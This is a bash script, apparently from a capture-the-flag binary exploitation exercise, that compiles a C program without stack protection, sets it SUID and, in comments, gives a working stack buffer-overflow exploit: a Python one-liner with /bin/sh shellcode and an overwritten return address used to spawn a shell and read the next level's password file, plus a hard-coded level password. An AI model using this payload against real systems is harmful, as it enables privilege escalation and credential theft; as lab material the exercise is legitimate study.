#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                 scp -P 4242 path/source.c level02@VM_IP:/tmp                  #
#                 scp -P 4242 path/script.sh level02@VM_IP:/tmp                 #
#                                                                               #
#                 pwd: PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv                 #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector source.c -o ft_level01

# Set SUID to give root user permissions
chmod u+s ft_level01

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level01 ~


# Then you have to run the program and cat .pass as level01 by taping manually these commands

# ============================================ #

#   su level01
#   // The the buffer address where the password is stored may have changed (find it with : ltrace /home/users/level02/ft_level01), here is 0x7fffffffe560
#   python -c 'print "dat_wil" + "\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 55 + "\x90\xe5\xff\xff\xff\x7f"' > /tmp/exploit
#   cat /tmp/exploit - | /home/users/level02/ft_level01
#   cat /home/users/level02/.pass

# ============================================ #